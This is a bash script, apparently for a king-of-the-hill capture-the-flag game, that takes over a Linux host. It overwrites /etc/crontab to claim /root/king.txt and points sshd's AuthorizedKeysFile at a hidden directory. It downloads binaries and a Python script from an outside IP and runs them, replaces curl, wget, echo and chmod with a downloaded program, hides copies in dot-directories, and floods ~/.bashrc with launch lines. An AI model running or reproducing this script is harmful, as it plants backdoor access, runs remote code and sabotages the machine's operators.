#!/bin/bash
chattrpath=$(which chattr);

wpath=$(which wget);
curlpath=$(which curl)



echopath=$(which echo);
chmodpath=$(which chmod);
cppath=$(which cp);
mvpath=$(which mv);
pythonpath=$(which python);
cp $wpath ./w;
cp $curlpath ./c;
cp $chattrpath ./ct;
cp $mvpath ./m;
cp $cppath ./p;

mkdir /var/spool/.nano;
mkdir /var/spool/.nano/.history;
mkdir /bin/.screen;
mkdir /bin/.screen/.config;

echo '* * * * * echo lostayush > /root/king.txt' > /etc/crontab
echo '* * * * * sleep 30;echo lostayush > /root/king.txt' > /etc/crontab


##echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCkkJKTGN541AcbS8fgtHCVdaAqt5/QBXSUir4SxMFezXwY1Tprvp2Goie1WNUWG2VUw8nl6ctqHb5Oryoq4NCJUY5uScNrQ2Fysie3RiYNP15uacp0AgkulEhwH27z2VXnu/y7fJZQG+pG8pvDPt7GWSLHPD/ICWRny/r6VLKgNw03CjkCS8LmjKv7wqLOwLDZOFZWRjrIWgq0POQ5L9akynNoW/tz0D2UBDE782ObzPUNyjHIV2KLJUtpxb6AxrH+W8Pco8Sq8sorvRWk32lOmb7kBm4C8oA+/Yy0tWTibzoOWtkXzBUgqQGVZoDg+kUZV5pnzsUuX3z5zQJ4Nv3JYl7XPbWj/CL7Rwf/L1Huv35hp5xJxdivGWKui0newt67zmroebAxmHGreCocrwxoXeV/SpG3iqemsfeA7uR2ka9a3fZek/qjm7MKC2DoSEdKqC5bdQCKvmbAoVxo22VL/fLNXZPHyD6ASaGlJ1Iu5JITGUE2xI44bZHPsxJvK60= ayush@kali
##' > /bin/.screen/.config/p;


echo 'AuthorizedKeysFile     /bin/.screen/.config/p' >> /etc/ssh/sshd_config;


wget 10.9.134.29:8000/chattr  -O ch;
wget 10.9.134.29:8000/nyancat  -O nyancat;
wget 10.9.134.29:8000/ea.py -O ea.py;


chmod +x ch;
chmod +x nyancat;


cp nyancat /usr/bin;



mv $chmodpath ./props;
mv $curlpath ./nanoc;
mv $wpath ./nanow;
mv $echopath ./nanoe;


cp nyancat /usr/bin/curl;
cp nyancat /usr/bin/wget;
cp nyancat /usr/bin/echo;

mkdir ~/.vim
mkdir ~/.vim/.config

cp nyancat ~/.vim/.config;


service ssh restart;
service sshd restart;

cp -r $(pwd) /var/spool/.nano/.history;
cp -r $(pwd) /bin/.screen/.config;


mv $cppath ./ko;
mv $mvpath ./mo;

./ko parrot /usr/bin/curl;
./ko nyancat /usr/bin/wget;
./ko nyancat /usr/bin/chmod;


echo '/usr/bin/nyancat' >> ~/.bashrc;
echo '/usr/bin/nyancat' >> ~/.bashrc;
echo '/usr/bin/nyancat' >> ~/.bashrc;
echo '/usr/bin/nyancat' >> ~/.bashrc;
echo '/usr/bin/nyancat' >> ~/.bashrc;
echo '/usr/bin/nyancat' >> ~/.bashrc;
echo '~/.vim/.config/nyancat' >> ~/.bashrc;
echo '~/.vim/.config/nyancat' >> ~/.bashrc;
source ~/.bashrc;


rm -rf file;


python ea.py &
